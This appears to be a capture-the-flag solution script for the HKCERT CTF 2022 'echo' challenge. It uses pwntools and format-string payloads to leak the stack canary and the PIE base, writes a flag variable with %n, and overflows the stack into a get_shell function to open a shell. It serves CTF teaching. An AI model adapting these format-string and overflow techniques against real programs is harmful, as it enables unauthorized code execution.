#!/usr/bin/env python3

'''
HKCERT CTF 2022 - echo
gcc -o echo echo.c

Source code and tutorial : https://www.youtube.com/watch?v=YODluCDBf5I&t=7937s

Organizer's solution that copied from the captioned video
'''

from pwn import *

elf =ELF('./echo')
p = process('./echo')

payload0 = b'||%19$p||'
p.sendlineafter(b'Input:\n', payload0)

p.recvuntil(b'||')
canary = int(p.recvuntil(b'||')[:-2], 16)

payload1 = b'||%17$p||'
p.sendlineafter(b'Input:\n', payload1)

p.recvuntil(b'||')
leaked_address = int(p.recvuntil(b'||')[:-2], 16)

pie_base = leaked_address - 0x1333
canleave = pie_base + elf.symbols['can_leave']
getshell = pie_base + elf.symbols['get_shell']

payload2 = b'a'*4 + b'%7$n' + p64(canleave)
p.sendlineafter(b'Input:\n', payload2)

ret_gadget = getshell + 25
len_of_input_before_canary = 0x68

payload3 = b'a' * len_of_input_before_canary + p64(canary) + p64(0) + p64(ret_gadget) + p64(getshell)

p.sendlineafter(b'\n', payload3)
p.sendlineafter(b'\n', b'--')

p.interactive()
